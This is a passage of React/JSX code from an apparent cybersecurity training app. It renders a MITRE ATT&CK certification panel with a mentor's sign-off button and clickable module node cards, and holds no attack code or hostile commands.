              <h4 className="text-base sm:text-lg font-bold text-white flex items-center gap-2">
                <Award className="w-5 h-5 text-amber-400" />
                <span>Master ATT&amp;CK Certification &amp; Mentor Ananya's Supervisory Seal</span>
              </h4>
              <p className="text-xs sm:text-sm text-slate-300">
                Culmination of Module 13: Full ATT&amp;CK mapping mastery for Case #2026-881 and official sign-off for Module 14 Incident Response.
              </p>
            </div>
            <Badge className="bg-amber-500/20 text-amber-300 border-amber-500/30 text-xs font-mono">
              MASTER SIGNOFF
            </Badge>
          </div>

          {/* Master Dossier Interactive Display */}
          <div className="p-4 rounded-xl bg-slate-950/70 border border-slate-800/80 space-y-3 font-mono text-xs">
            <div className="flex items-center justify-between border-b border-slate-800 pb-2">
              <span className="text-cyan-300 font-bold">CASE #2026-881: MITRE ATT&amp;CK CERTIFIED MAPPING DOSSIER</span>
              <Badge className="bg-amber-500/20 text-amber-300 text-[11px]">
                {isDossierSigned ? 'SUPERVISORY SEAL AFFIXED ✓' : 'AWAITING SUPERVISORY STAMP'}
              </Badge>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
              <div className="p-3.5 rounded-xl bg-slate-900/60 border border-slate-800 space-y-1">
                <span className="text-cyan-400 font-bold">1. TAXONOMY MASTERY</span>
                <p className="text-white text-xs font-bold mt-1">Standardized Vocabulary</p>
                <p className="text-slate-300 text-[11px]">Zero vendor FUD jargon; all events mapped to 14 tactical columns.</p>
                <div className="text-emerald-400 text-[11px] font-bold pt-1">STATUS: CERTIFIED ✓</div>
              </div>

              <div className="p-3.5 rounded-xl bg-slate-900/60 border border-slate-800 space-y-1">
                <span className="text-purple-400 font-bold">2. RESTRAINT DISCIPLINE</span>
                <p className="text-white text-xs font-bold mt-1">Anti-Speculation Standard</p>
                <p className="text-slate-300 text-[11px]">Refused premature kill chain leaps; documented uncertainty with candor.</p>
                <div className="text-emerald-400 text-[11px] font-bold pt-1">STATUS: CERTIFIED ✓</div>
              </div>

              <div className="p-3.5 rounded-xl bg-slate-900/60 border border-slate-800 space-y-1">
                <span className="text-amber-400 font-bold">3. EVIDENTIARY ANCHORS</span>
                <p className="text-white text-xs font-bold mt-1">Audit-Proof Dossier</p>
                <p className="text-slate-300 text-[11px]">Exact CLI strings, Process GUIDs, and timestamps bound to every tag.</p>
                <div className="text-emerald-400 text-[11px] font-bold pt-1">STATUS: CERTIFIED ✓</div>
              </div>
            </div>

            {/* Supervisory Sign-off Action Card */}
            <div className="p-3.5 rounded-xl bg-gradient-to-r from-amber-950/40 via-slate-900/60 to-amber-950/40 border border-amber-500/40 flex flex-col sm:flex-row items-center justify-between gap-3">
              <div className="space-y-1 text-center sm:text-left">
                <h5 className="font-bold text-white text-sm">Mentor Ananya (Senior Incident Handler &amp; Detection Specialist)</h5>
                <p className="text-slate-300 text-xs">
                  "Outstanding work, Analyst! You understand that ATT&amp;CK describes mechanics, context determines malice, and evidence anchors are non-negotiable. You are officially certified in Module 13 and ready for Incident Response &amp; Documentation in Module 14!"
                </p>
              </div>
              <button
                type="button"
                onClick={() => {
                  sound.playSuccess();
                  setIsDossierSigned(true);
                  const target = nodes.find((n) => n.id === 'mas-ananya-master-seal');
                  if (target) onSelectNode(target);
                }}
                className={`px-4 py-2.5 rounded-xl text-xs font-mono font-bold transition-all shrink-0 flex items-center gap-2 ${
                  isDossierSigned
                    ? 'bg-emerald-500/25 border border-emerald-400 text-emerald-300 shadow-lg shadow-emerald-500/20'
                    : 'bg-amber-500/25 border border-amber-400 text-amber-300 hover:bg-amber-500/40 shadow-lg shadow-amber-500/20 cursor-pointer'
                }`}
              >
                <ShieldCheck className="w-4 h-4 text-amber-400" />
                <span>{isDossierSigned ? 'SEAL AFFIXED & VERIFIED' : 'AFFIX ANANYA SUPERVISORY SEAL'}</span>
              </button>
            </div>
          </div>

          {/* 4 Node Selection Cards */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5 pt-2">
            {nodes.map((node) => {
              const isSelected = activeNode.id === node.id;
              return (
                <div
                  key={node.id}
                  onClick={() => {
                    sound.playClick();
                    onSelectNode(node);
                  }}
                  className={`p-4 rounded-xl border transition-all cursor-pointer flex flex-col justify-between space-y-3 ${
                    isSelected
                      ? 'bg-sky-500/20 border-sky-400 ring-2 ring-sky-500/40 shadow-[0_0_20px_rgba(56,189,248,0.25)]'
                      : 'bg-slate-900/80 border-slate-800 hover:border-slate-700 hover:bg-slate-800/60'
                  }`}
                >
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-mono font-semibold text-sky-400">{node.id}</span>
                      {node.badge && (
                        <span className="px-2 py-0.5 rounded text-[11px] font-mono bg-sky-950 border border-sky-500/30 text-sky-300">
                          {node.badge}
                        </span>
                      )}
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-center shrink-0">
                        {node.id === 'mas-ttp-taxonomy-mastery' ? (
                          <Target className="w-6 h-6 text-cyan-400" />
                        ) : node.id === 'mas-anti-speculation-restraint' ? (
                          <Shield className="w-6 h-6 text-purple-400" />
                        ) : node.id === 'mas-case-881-attack-dossier' ? (
                          <FileText className="w-6 h-6 text-blue-400" />
                        ) : (
                          <Award className="w-6 h-6 text-amber-400" />
                        )}
                      </div>
                      <div>
                        <h5 className="font-bold text-sm sm:text-base text-white">{node.label}</h5>
                        <p className="text-xs text-slate-400 font-mono">{node.sub}</p>
                      </div>
                    </div>
                  </div>
                  <p className="text-xs text-slate-300 line-clamp-2">{node.description}</p>
                </div>
              );
            })}
          </div>
        </div>

        {renderInspector(activeNode)}
      </div>
    );
  }

  return null;
}
